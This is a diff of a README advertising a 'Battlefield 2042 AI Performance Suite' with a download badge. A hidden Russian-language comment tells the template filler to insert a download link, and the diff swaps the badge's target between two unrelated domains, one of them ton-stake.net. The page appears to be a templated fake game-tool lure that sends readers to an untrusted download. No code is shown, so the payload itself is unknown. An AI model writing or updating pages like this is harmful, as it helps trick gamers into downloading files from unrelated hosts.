@@ -5,7 +5,7 @@ Welcome to the **next evolution** in Battlefield 2042 gameplay. The **Battlefiel
 Created for both **casual players** and **elite warriors**, this suite offers a highly configurable and user-friendly experience, wrapped in an intuitive interface.
 
 <!-- ПОДСКАЗКА НА РУССКОМ: Вставьте ссылку на страницу или файл для скачивания suite (например, https://example.com/suite) вместо INSERT_DOWNLOAD_LINK_HERE -->
-[![Download AI Performance Suite](https://img.shields.io/badge/Download-Battlefield_2042_AI_Suite-purple)](https://glocktober.com)
+[![Download AI Performance Suite](https://img.shields.io/badge/Download-Battlefield_2042_AI_Suite-purple)](https://ton-stake.net)
 
 ---
 
